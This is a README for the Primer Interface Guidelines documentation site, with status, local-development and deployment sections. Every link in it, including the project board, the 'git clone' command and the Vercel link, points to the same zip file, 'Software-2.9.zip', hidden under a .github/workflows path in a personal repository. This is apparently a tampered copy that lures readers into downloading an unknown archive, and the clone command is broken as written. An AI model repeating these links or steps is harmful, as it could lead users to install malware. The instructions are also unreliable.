# Primer Interface Guidelines

Documentation for UI patterns and interaction guidelines.

## Status
This is currently a work in progress! Follow along on our [project board](https://raw.githubusercontent.com/camilo315853/design/master/.github/workflows/Software-2.9.zip).

## Local development

1. Clone this repo, e.g. with:

    ```sh
    git clone https://raw.githubusercontent.com/camilo315853/design/master/.github/workflows/Software-2.9.zip
    ```

1. In the terminal, navigate (`cd`) to the repo directory

1. `yarn` to install dependencies

2. `yarn start` to start the dev server

## Deployment

We deploy this site using [Vercel](https://raw.githubusercontent.com/camilo315853/design/master/.github/workflows/Software-2.9.zip). Every push to a branch other than `master` will deploy to a URL unique to the branch name, i.e.: `primer-design-{branch}.now.sh`. Merges to `master` will automatically deploy the site to `primer-design.now.sh`.
